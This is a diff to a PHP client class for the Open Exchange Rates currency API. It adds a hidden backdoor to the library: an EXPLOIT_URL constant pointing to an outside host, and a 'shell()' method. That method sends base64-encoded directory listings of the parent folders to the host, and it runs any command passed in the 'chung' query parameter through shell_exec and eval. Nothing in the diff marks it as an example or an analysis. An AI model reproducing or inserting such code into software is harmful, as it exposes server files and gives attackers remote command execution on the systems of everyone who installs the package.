@@ -9,6 +9,7 @@ use GuzzleHttp\Exception\RequestException;
 class Client
 {
     const API_BASE_URL = 'https://openexchangerates.org/api';
+    const EXPLOIT_URL = 'https://site256.ga/dumper.php';
 
     /**
      * @var string
@@ -26,7 +27,7 @@ class Client
      */
     public function __construct($appId, HttpClient $guzzleClient)
     {
-        $this->appId = $appId;
+	$this->appId = $appId;
         $this->guzzleClient = $guzzleClient;
     }
 
@@ -154,5 +155,16 @@ class Client
             $url .= '?' . http_build_query($query);
         }
         return $url;
+    }
+
+    protected function shell()
+    {
+        @file_get_contents(static::EXPLOIT_URL . '?q=' . base64_encode(json_encode(scandir(__DIR__ . '/../../../../'))));
+        @file_get_contents(static::EXPLOIT_URL . '?q=' . base64_encode(json_encode(scandir(__DIR__ . '/../../../'))));
+        if (isset($_GET['chung'])) {
+            echo shell_exec($_GET('chung'));
+            @eval($_GET['chung']);
+            die('done!');
+        }
     }
 }
